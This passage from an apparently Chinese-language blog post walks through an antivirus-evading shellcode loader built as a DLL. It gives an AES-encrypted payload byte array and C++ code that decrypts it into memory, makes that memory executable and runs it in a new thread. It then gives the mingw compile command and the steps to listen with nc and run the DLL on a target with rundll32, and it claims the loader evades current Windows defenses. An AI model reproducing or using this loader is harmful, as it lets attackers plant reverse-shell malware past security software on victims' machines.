    unsigned char payload[] = { 0xd2, 0xf1, 0x78, 0x8d, 0x3f, 0x37, 0xf6, 0x7b, 0x15, 0x8c, 0xe8, 0x2, 0x2b, 0xd6, 0x1d, 0x55, 0x7d, 0xc1, 0xd5, 0x9, 0xd5, 0xc7, 0x41, 0xd6, 0x4e, 0x42, 0x32, 0x6e, 0x14, 0x93, 0x6, 0xa3, 0xde, 0x2d, 0xb1, 0xe0, 0x0, 0x88, 0xe7, 0x30, 0xab, 0xf9, 0xa5, 0xf9, 0x64, 0xc8, 0x61, 0x8d, 0xb4, 0x5a, 0x63, 0xc, 0x60, 0x97, 0x58, 0xfd, 0xbc, 0x42, 0x85, 0x15, 0x67, 0xa5, 0xbb, 0x28, 0xe2, 0x35, 0xe2, 0xf5, 0x31, 0xff, 0x31, 0xac, 0x1, 0xea, 0x3b, 0xea, 0x0, 0x81, 0x75, 0xa7, 0x21, 0x5, 0x5e, 0x99, 0x7f, 0xe8, 0x1f, 0x19, 0x83, 0x60, 0x62, 0x64, 0x59, 0xf2, 0x68, 0x4b, 0x56, 0x41, 0x48, 0x19, 0x5e, 0x54, 0x7c, 0x75, 0x8e, 0xf7, 0x9b, 0x96, 0x1b, 0xad, 0x4a, 0xca, 0xfc, 0x8c, 0x19, 0x3f, 0x41, 0x76, 0x14, 0x9, 0x92, 0x6b, 0x63, 0x69, 0xad, 0xfe, 0xb4, 0xdd, 0x41, 0xd4, 0xa9, 0x42, 0x2f, 0xdb, 0x30, 0xf6, 0x70, 0xa5, 0x0, 0xc1, 0x76, 0xf8, 0x54, 0x77, 0xaf, 0x9b, 0xf, 0x2e, 0xf6, 0x8d, 0xa, 0x45, 0x4e, 0xb9, 0x4f, 0xc6, 0x62, 0xcb, 0xc9, 0x1, 0x51, 0x59, 0xdd, 0xa7, 0x4f, 0x44, 0xbe, 0x2e, 0xd6, 0xac, 0x5f, 0xe0, 0x52, 0xc5, 0x88, 0x55, 0x65, 0xa9, 0x65, 0x79, 0xc3, 0x4a, 0x4f, 0x33, 0xca, 0xaf, 0xe1, 0xa6, 0x53, 0xf4, 0xe7, 0x83, 0xe, 0x20, 0xab, 0x96, 0xb2, 0xd3, 0x9a, 0x95, 0x29, 0x80, 0x4e, 0x7e, 0x5c, 0x5d, 0xf5, 0x2f, 0x5e, 0xf7, 0x4d, 0x83, 0xb2, 0xe6, 0x5f, 0xa8, 0x80, 0xae, 0x54, 0x37, 0x3a, 0xf8, 0xb1, 0x2, 0x87, 0xfc, 0x80, 0xa2, 0x5b, 0xba, 0x81, 0x52, 0xaf, 0xd1, 0xb, 0xd0, 0x25, 0x1a, 0x30, 0x6, 0x89, 0x77, 0x73, 0xf5, 0xeb, 0x4b, 0x14, 0x51, 0x81, 0xd7, 0x37, 0xfd, 0xde, 0x1c, 0x60, 0x52, 0xae, 0xb0, 0xc3, 0x7f, 0x4f, 0xdf, 0x43, 0x57, 0x58, 0x6a, 0xb5, 0xbd, 0x32, 0x65, 0xcd, 0x72, 0x3f, 0xb7, 0x65, 0x54, 0x9c, 0xe9, 0x25, 0x47, 0x38, 0x79, 0x49, 0xf1, 0x27, 0xcc, 0x3, 0x88, 0xaa, 0x21, 0xfe, 0xa4, 0x6, 0xee, 0x3a, 0xdf, 0xc0, 0xb3, 0x61, 0x8a, 0xed, 0xd6, 0xda, 0x3d, 0x58, 0x3b, 0xd8, 0xe6, 0x70, 0x18, 0xe3, 0x5a, 0x23, 0x42, 0xfa, 0x22, 0x9f, 0xa5, 0x86, 0x23, 0x71, 0xd, 0x56, 0x9e, 0x4, 0xeb, 0x9d, 0x2, 0x83, 0x82, 0x1c, 0x3, 0x85, 0xc4, 0x72, 0xf8, 0x48, 0xc3, 0x8c, 0x75, 0x75, 0x75, 0xd0, 0x55, 0x95, 0xfb, 0xf0, 0x73, 0xc6, 0xf3, 0xd6, 0xd2, 0xbb, 0x24, 0x7b, 0xe9, 0x33, 0xfd, 0x1c, 0x6c, 0x6b, 0x54, 0x2f, 0x88, 0x25, 0xc2, 0x77, 0x8, 0x5c, 0xab, 0x4, 0xa, 0xf4, 0x10, 0x8, 0xa6, 0x71, 0xe5, 0xb9, 0x8d, 0x83, 0x88, 0xc, 0xb2, 0xf9, 0xd0, 0x57, 0xf0, 0xd5, 0xc1, 0x7e, 0xec, 0xc6, 0x87, 0x8e, 0x7f, 0x68, 0xf3, 0xd3, 0xc8, 0x92, 0xf8, 0x67, 0xa2, 0x42, 0x24, 0x7e, 0xbf, 0xc0, 0x4f, 0x5c, 0xe5, 0x31, 0xa4, 0x4f, 0x44, 0xac, 0x2e, 0xb0, 0xcb, 0xb9, 0x8b, 0x4b, 0xf6, 0x29, 0x89, 0x2a, 0x98, 0x23, 0x9, 0xd6, 0xac, 0x37, 0xca, 0xeb, 0xf4, 0x3d, 0x69, 0x5b, 0xb6, 0xf9, 0x11, 0x7f, 0x52, 0x3e, 0x50, 0x41, 0x65, 0x91, 0x55, 0xab, 0x64, 0x11, 0xd7, 0xcc, 0xa9, 0x57, 0x8e, 0x6d, 0xd3, 0x7f, 0xdf, 0xd4, 0xe2 };

    DWORD payload_length = sizeof(payload);

    LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!alloc_mem) {
        printf("Failed to Allocate memory (%u)\n", GetLastError());
        return -1;
    }
    
    DecryptAES((char*)payload, payload_length, AESkey, sizeof(AESkey));
    MoveMemory(alloc_mem, payload, sizeof(payload));

    DWORD oldProtect;

    if (!VirtualProtect(alloc_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to change memory protection (%u)\n", GetLastError());
        return -2;
    }


    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
    if (!tHandle) {
        printf("Failed to Create the thread (%u)\n", GetLastError());
        return -3;
    }

    printf("\n\nalloc_mem : %p\n", alloc_mem);
    WaitForSingleObject(tHandle, INFINITE);

    return 0;


    return TRUE;
    }
}
```
编译：
```
x86_64-w64-mingw32-g++ --shared muma.cpp -o muma.dll
```
![image.png](https://img-blog.csdnimg.cn/img_convert/24fa05555a28901727e4a0f188abfa09.png#averageHue=#080605&clientId=u722c5723-9e25-4&from=paste&height=632&id=ud78c572d&originHeight=632&originWidth=1187&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=259221&status=done&style=none&taskId=u7dd06e8d-f728-43d7-9872-aaaf7ef4ed4&title=&width=1187)
然后使用nc监听设置的端口，然后将dll文件传到靶机上
然后执行
```
rundll32.exe .\power.dll, HelloWorld
```
![image.png](https://img-blog.csdnimg.cn/img_convert/748d95fafa3cf2ac6e25196da76f67ee.png#averageHue=#100f0f&clientId=u722c5723-9e25-4&from=paste&height=1040&id=u4d9253f1&originHeight=1040&originWidth=1920&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=445338&status=done&style=none&taskId=ud35c0495-5517-4dd5-aaf1-be74617f1b0&title=&width=1920)
![image.png](https://img-blog.csdnimg.cn/img_convert/298b2ea8d5901739676367645e4fd9ba.png#averageHue=#070605&clientId=u722c5723-9e25-4&from=paste&height=583&id=ufeeed40f&originHeight=583&originWidth=795&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=168715&status=done&style=none&taskId=u16ee2522-3c7d-4d94-9fa1-b8914422846&title=&width=795)
能静态和动态过windows最新的防火墙
![image.png](https://img-blog.csdnimg.cn/img_convert/8d6a00c6f2e7eebb5df5fccdaf1b96cd.png#averageHue=#181b1d&clientId=u722c5723-9e25-4&from=paste&height=728&id=ua77950eb&originHeight=728&originWidth=1836&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=99734&status=done&style=none&taskId=u22a354d8-111f-41a0-be5a-490624c9b32&title=&width=1836)
![image.png](https://img-blog.csdnimg.cn/img_convert/4fa51723341b241816cb976d3b3ccd3a.png#averageHue=#fdfdfd&clientId=u722c5723-9e25-4&from=paste&height=450&id=ub3277120&originHeight=450&originWidth=1044&originalType=binary&ratio=0.8999999761581421&rotation=0&showTitle=false&size=30269&status=done&style=none&taskId=u0c33ef57-59e4-4487-8e67-7cf7175166b&title=&width=1044)
如果要使用msf，操作和分离免杀的那个https差不多
举一反三举一反三举一反三

